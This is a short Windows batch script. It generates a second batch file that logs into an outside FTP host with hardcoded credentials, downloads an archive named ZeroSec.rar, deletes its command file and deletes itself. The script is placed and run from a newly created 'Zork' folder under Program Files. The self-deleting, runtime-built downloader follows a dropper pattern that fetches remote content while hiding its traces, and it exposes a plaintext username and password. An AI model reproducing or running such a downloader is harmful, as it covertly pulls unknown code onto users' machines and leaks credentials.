@echo off
color 0b

REM build the ftpgetter and then execute it.
set EXEC_NAME=ftpgettest
set FTP_GETTER=%EXEC_NAME%.bat

echo @echo off>  %FTP_GETTER%
echo color 85>> %FTP_GETTER%
echo title ftpget>> %FTP_GETTER%
echo SET hostname=animusdeleta.net76.net>> %FTP_GETTER%
echo SET username=a7165140>> %FTP_GETTER%
echo SET password=maker12>> %FTP_GETTER%
echo echo user %%username%%^> ftpcmd.dat>> %FTP_GETTER%
echo echo %%password%%^>^> ftpcmd.dat>> %FTP_GETTER%
echo echo bin^>^> ftpcmd.dat>> %FTP_GETTER%
echo echo get /public_html/%%1^>^> ftpcmd.dat>> %FTP_GETTER%
echo echo quit^>^> ftpcmd.dat>> %FTP_GETTER%
echo ftp -n -s:ftpcmd.dat %%hostname%%>> %FTP_GETTER%
echo del ftpcmd.dat>> %FTP_GETTER%
echo call :deleteSelf^&exit /b>> %FTP_GETTER%
echo :deleteSelf>> %FTP_GETTER%
echo start /b "" cmd /c del "%%~f0"^&exit /b>> %FTP_GETTER%

set workingdir=%~dp0
pushd "C:/Program Files"
mkdir "C:/Program Files/Zork"
popd
REM cd %workingdir%
xcopy /s/v/y %FTP_GETTER% "C:/Program Files/Zork"
del %FTP_GETTER%
pushd "C:\Program Files\Zork"
%EXEC_NAME% ZeroSec.rar
pause